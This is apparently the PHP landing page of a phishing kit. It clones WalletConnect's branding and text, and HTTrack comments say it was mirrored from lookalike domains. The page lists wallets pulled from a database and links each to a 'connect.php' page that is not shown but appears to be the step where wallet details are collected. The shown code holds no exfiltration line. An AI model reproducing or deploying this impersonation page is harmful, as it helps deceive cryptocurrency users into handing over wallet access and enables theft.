<?php include "include/config.php";?>

<html>

<!-- Mirrored from walletconnect.biz/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 15 Mar 2021 00:23:24 GMT -->
<!-- Added by HTTrack -->
<!-- Mirrored from walletconnect.org.in/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jun 2021 16:52:13 GMT -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<link rel="stylesheet" href="main.css" type="text/css"/> 
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Open protocol for connecting Wallets to Dapps">
<meta property="og:image" content="images/logo.svg">
<link rel="icon" href="images/logo.svg">

<script>
function show() {
  var x = document.getElementById("hidden");
  if (x.style.display === "none") {
    x.style.display = "block";
  } else {
    x.style.display = "none";
  }

  if (x.style.display === "block") {
    document.getElementById("btn").innerHTML = "Show Less &uarr;";
  } 
}
</script>
</head>

<?php include "include/head.php";?>
<div class="gFeYHJ">WalletConnect</div>

<div class="lpfxqP">Open protocol for connecting Wallets to Dapps</div>
</br>

<div class="dXgqeu">
<img src="images/banner.png" alt="WalletConnect">
</div>

<div class="bout">
<h2 class="home">What is WalletConnect?</h2>
<p>WalletConnect is an open source protocol for connecting decentralised applications to mobile wallets with QR code scanning or deep linking. 
A user can interact securely with any Dapp from their mobile phone, making WalletConnect wallets a safer choice compared to desktop or browser 
extension wallets.</p></br>
<h2 class="home">How does it work?</h2>
<p>WalletConnect connects web applications to supported <a href="#">mobile wallets</a>. WalletConnect session is started by a scanning a QR 
code (desktop) or by clicking an application deep link (mobile).</p>
</div>

<div class="wallets" id="wallets">
    <h1 class="home">Wallets</h1>
<p>Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>

</br>
<div class="all">
    <?php
     $get_wallet = "select * from wallets limit 0,30";
     $run_wallet = mysqli_query($connect,$get_wallet);
    while($row_wallet = mysqli_fetch_array($run_wallet)){
        $wallet_name = $row_wallet['wallet_name'];
        $wallet_name1 = ucfirst($wallet_name);
        echo"
        <div class='apps'>
    <a href='connect.php?type=$wallet_name'><img src='images/$wallet_name.png'></a></br>
    $wallet_name1
</div>
        ";
    }
    
    ?>





</div>
</br>
<button onclick="show()" class="btn" id="btn">Show More &darr;</button>
</br></br>
<div class="hidden" id="hidden">
<div class="all">
<?php
     $get_wallet = "select * from wallets limit 30,100";
     $run_wallet = mysqli_query($connect,$get_wallet);
    while($row_wallet = mysqli_fetch_array($run_wallet)){
        $wallet_name = $row_wallet['wallet_name'];
        $wallet_name1 = ucfirst($wallet_name);
        echo"
        <div class='apps'>
    <a href='connect.php?type=$wallet_name'><img src='images/$wallet_name.png'></a></br>
    $wallet_name1
</div>
        ";
    }
    ?>


</div>

</div>


</div>

<?php include "include/foot.php";?>
</center>
</body>

<!-- Mirrored from walletconnect.biz/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 15 Mar 2021 00:23:55 GMT -->

<!-- Mirrored from walletconnect.org.in/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jun 2021 16:53:03 GMT -->
</html>
